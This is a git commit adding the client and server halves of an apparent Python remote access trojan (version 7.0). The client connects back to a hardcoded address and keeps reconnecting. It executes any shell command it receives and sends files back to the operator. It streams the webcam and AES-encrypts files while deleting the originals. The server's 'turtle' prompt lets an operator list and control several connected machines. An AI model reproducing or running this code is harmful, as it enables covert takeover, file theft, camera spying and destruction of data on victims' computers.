78c671d5b1f674d2acb72de9b0fdce69a8b3dab8
al0258 <35347803+al0258@users.noreply.github.com>
2018-01-18 09:57:37 +0200

    Add files via upload

---
+++ v7.0/Client.py
@@ -0,0 +1,261 @@
+import os
+import cv2
+import time
+import socket
+import random
+import subprocess
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+
+
+def socket_create():
+    """
+    The function creates socket (allows two computers to connect)
+
+
+    :return: None
+    """
+    try:
+        global host
+        global port
+        global s
+        host = '192.168.1.114'
+        # host = get_lan_ip()
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print('Socket creation error: ' + str(msg))
+
+
+def socket_connect():
+    """
+    The function connects to a remote socket
+
+
+    :return: None
+    """
+    try:
+        global host
+        global port
+        global s
+        # print('Binding socket to port: ' + str(port))
+        s.connect((host, port))
+    except socket.error as msg:
+        print('Socket connection error: ' + str(msg))
+        time.sleep(5)
+        socket_connect()
+
+
+def send_file(file_path):
+    """
+    The function sends a file to the server
+
+    :param file_path: The path of the file we want to send
+    :type file_path: str
+
+    :return: None
+    """
+    f = open(str(file_path), 'rb')
+    print 'Sending...'
+    file_conn = f.read(20480)
+    while file_conn:
+        print 'Sending...'
+        s.send(file_conn)
+        file_conn = f.read(20480)
+    f.close()
+    print "Done Sending"
+    output_str = "The file was sent" + "\n"
+    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+
+
+def receive_commands():
+    """
+    The function receives commands from the socket
+
+    :return: None
+    """
+    while True:
+        data = s.recv(20480)
+        command = data.decode("utf-8")
+        command_with_data = command.split()
+        if data[:2].decode("utf-8") == 'cd':
+            try:
+                os.chdir(data[3:].decode("utf-8"))
+            except:
+                pass
+        if data[:].decode("utf-8") == 'quit':
+            s.close()
+            break
+        if len(data) > 0:
+            # File transfer
+            # """
+            if data[:8].decode("utf-8") == 'transfer':
+                file_name = data[9:].decode("utf-8")
+                file_path = str(os.getcwd()) + chr(92) + file_name
+                if not os.path.exists(file_path):
+                    output_str = "The file does not exist" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+                else:
+                    try:
+                        send_file(file_path)
+                    except:
+                        output_str = "Could not transfer the file" + "\n"
+                        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                        print(output_str)
+
+            # """
+            # The rest of commands
+
+            elif command_with_data[0] == 'encrypt':
+                file_name = command_with_data[1]
+                file_path = str(os.getcwd()) + chr(92) + file_name
+                password = command_with_data[2]
+                try:
+                    encrypt(get_key(password), file_name, file_path)
+                    output_str = "File encrypted" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+                except:
+                    output_str = "Could not encrypt the file" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+            elif command_with_data[0] == 'decrypt':
+                file_name = command_with_data[1]
+                file_path = str(os.getcwd()) + chr(92) + file_name
+                password = command_with_data[2]
+                try:
+                    decrypt(get_key(password), file_name, file_path)
+                    output_str = "File decrypted" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+                except:
+                    output_str = "Could not decrypt the file" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+            elif data.decode("utf-8").__contains__('show camera'):
+                while True:
+                    video = cv2.VideoCapture(0)
+                    check, frame = video.read()
+                    s.send(frame)
+
+            else:
+                try:
+                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE,
+                                           stdin=subprocess.PIPE)
+                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                    output_str = str(output_bytes)
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print output_str
+                except:
+                    output_str = "Command not recognized" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+    s.close()
+
+
+def get_key(password):
+    """
+    The program gets a password and coverts it to something we can use
+    to encrypt
+
+    :param password: The users picked password
+    :type password: str
+
+    :return: a password we can use in encryption
+    """
+    hasher = SHA256.new(password).digest()
+    return hasher
+
+
+def encrypt(key, filename, file_path):
+    """
+    The function encrypts the file given
+
+    :param key: The encryption key
+
+    :param filename: The name of the file to encrypt
+    :type filename: str
+
+    :param file_path: The path of the file to encrypt
+    :type file_path: str
+
+    :return: None
+    """
+    chunk_size = 64 * 1024
+    output_file = str(os.getcwd()) + chr(92) + "(encrypted)" + filename
+    file_size = str(os.path.getsize(file_path)).zfill(16)
+    iv = ""
+
+    for i in range(16):
+        iv += chr(random.randint(0, 0xFF))
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+
+    with open(file_path, 'rb') as infile:
+        with open(output_file, 'wb') as output_file:
+            output_file.write(file_size)
+            output_file.write(iv)
+
+            while True:
+                chunk = infile.read(chunk_size)
+
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += ' ' * (16 - (len(chunk) % 16))
+
+                output_file.write(encryptor.encrypt(chunk))
+    os.remove(file_path)
+
+
+def decrypt(key, filename, file_path):
+    """
+    The function decrypts the file given
+
+    :param key: The decryption key
+
+    :param filename: The name of the file to encrypt
+    :type filename: str
+
+    :param file_path: The path of the file to encrypt
+    :type file_path: str
+
+    :return: None
+    """
+    chunk_size = 64 * 1024
+    output_file = str(os.getcwd()) + chr(92) + filename[11:]
+
+    with open(file_path, 'rb') as infile:
+        file_size = long(infile.read(16))
+        iv = infile.read(16)
+
+        decryptor = AES.new(key, AES.MODE_CBC, iv)
+        with open(output_file, 'wb') as outfile:
+            while True:
+                chunk = infile.read(chunk_size)
+
+                if len(chunk) == 0:
+                    break
+
+                outfile.write(decryptor.decrypt(chunk))
+            outfile.truncate(file_size)
+    os.remove(file_path)
+
+
+def main():
+    global s
+    try:
+        socket_create()
+        socket_connect()
+        receive_commands()
+    except:
+        print("Error in main")
+        time.sleep(5)
+    s.close()
+    main()
+
+
+if __name__ == '__main__':
+    main()
---
+++ v7.0/Server.py
@@ -0,0 +1,288 @@
+# Future imports to work like Python 3
+from __future__ import print_function
+import cv2
+import time
+import socket
+import threading
+from Queue import Queue
+
+# Constant variables
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_addresses = []
+COMMANDS = {'help': ['Shows this help'],
+            'list': ['Lists connected clients'],
+            'transfer': [
+                'After making a connection, you can use this command '
+                'to transfer files'],
+            'encrypt': [
+                'After making a connection, you can use this command '
+                'to encrypt files on the clients computer'],
+            'decrypt': [
+                'After making a connection, you can use this command '
+                'to decrypt files on the clients computer'],
+            'select': [
+                'Selects a client by its index on the list.'
+                ' Takes index as a parameter'],
+            'quit': [
+                'Stops current connection with a client. To be used when'
+                ' client is selected']
+            }
+
+
+def print_help():
+    """
+    The function prints all the commands we can use and what they do
+
+    :return: None
+    """
+    for cmd, explanation in COMMANDS.iteritems():
+        print("{0}:\t{1}".format(cmd, explanation[0]))
+
+
+def socket_create():
+    """
+    The function creates socket (allows two computers to connect)
+
+    :return: None
+    """
+    try:
+        global host
+        global port
+        global s
+        host = ''
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print('Socket creation error: ' + str(msg))
+
+
+def socket_bind():
+    """
+    The function binds socket to port and wait for connection from client
+
+
+    :return: None
+    """
+    try:
+        global host
+        global port
+        global s
+        # print('Binding socket to port: ' + str(port))
+        s.bind((host, port))
+        s.listen(5)
+    except socket.error as msg:
+        print('Socket binding error: ' + str(msg) + "\n" + "Retrying...")
+        time.sleep(5)
+        socket_bind()
+
+
+def accept_connections():
+    """
+    The function accepts connections from multiple clients and save to list
+
+
+    :return: None
+    """
+    for connection in all_connections:
+        connection.close()
+    del all_connections[:]
+    del all_addresses[:]
+    while True:
+        try:
+            conn, address = s.accept()
+            conn.setblocking(1)
+            all_connections.append(conn)
+            all_addresses.append(address)
+            print("\n Connection has been established: " + address[0])
+        except:
+            print("Error accepting connections")
+
+
+def start_turtle():
+    """
+    The function shows an interactive prompt for sending commands remotely
+
+
+    :return: None
+    """
+    while True:
+        cmd = raw_input('turtle> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        elif cmd == 'help':
+            print_help()
+        else:
+            print("Command not recognized")
+
+
+def list_connections():
+    """
+    The function displays all the current connections
+
+    :return: None
+    """
+    results = ''
+    for counter, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[counter]
+            del all_addresses[counter]
+            continue
+        results += str(counter) + '   ' + str(
+            all_addresses[counter][0]) + '   ' + str(
+            all_addresses[counter][1]) + '\n'
+    print('------- Clients -------' + '\n' + results)
+
+
+def get_target(cmd):
+    """
+    The function helps the server select a client
+
+    :param cmd: The command we are trying to execute
+    :type cmd: str
+
+    :return: A IP address of a client to connect to
+    :rtype: str
+    """
+    try:
+        target = cmd.replace('select ', '')
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to " + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + '> ', end="")
+        return conn
+    except:
+        print("Not a valid selection")
+        return None
+
+
+def get_file(command, conn):
+    """
+    The function receives a file from the target computer
+
+    :param command: The command with the file name
+    :type command: str
+
+    :param conn: The connection to the target computer
+
+    :return: None
+    """
+    f = open(str(command[9:]), 'wb')
+    not_exist = False
+    while True:
+        print("Receiving...")
+        file_conn = conn.recv(20480)
+        while file_conn:
+            if str(file_conn).__contains__('The file was sent'):
+                f.write(file_conn[:str(file_conn).find('The file was sent')])
+                break
+            elif str(file_conn).__contains__('The file does'):
+                print('The file does not exist rewrite the command')
+                not_exist = True
+                break
+            print("Receiving...")
+            f.write(file_conn)
+            file_conn = conn.recv(20480)
+        if not not_exist:
+            f.close()
+            print("Done Receiving")
+            print(str(file_conn[str(file_conn).find('The file was '
+                                                    'sent'):]), end="")
+            break
+
+def get_camera(cmd,conn):
+
+    frame = conn.recv(1000000)
+    cv2.imshow("Capturing", frame)
+    key = cv2.waitKey(0)
+
+
+
+def send_target_commands(conn):
+    """
+    The function connects to a target client and executes commands
+
+    :param conn: a connection
+
+    :return: None
+    """
+    while True:
+        try:
+            cmd = raw_input()
+            if len(str.encode(cmd)) > 0:
+                if cmd[:8] == 'transfer':
+                    conn.send(str.encode(cmd))
+                    get_file(cmd, conn)
+                    continue
+                elif cmd.__contains__('show camera'):
+                    conn.send(str.encode(cmd))
+                    get_camera(cmd, conn)
+                    continue
+                else:
+                    conn.send(str.encode(cmd))
+                    client_response = str(conn.recv(20480))
+                    print(client_response, end="")
+            if cmd == 'quit':
+                break
+        except:
+            print("Connection was lost")
+            break
+
+
+def create_workers():
+    """
+    The function creates the threads (Workers)
+
+    :return: None
+    """
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+
+def work():
+    """
+    The function does the next job in the queue (one handles connections,
+    the other sends commands)
+
+    :return: None
+    """
+    while True:
+        x = queue.get()
+        if x == 1:
+            socket_create()
+            socket_bind()
+            accept_connections()
+        if x == 2:
+            start_turtle()
+        queue.task_done()
+
+
+def create_jobs():
+    """
+    The function defines each item on the list as a new job
+
+    :return: None
+    """
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
+
+def main():
+    create_workers()
+    create_jobs()
+
+
+if __name__ == '__main__':
+    main()
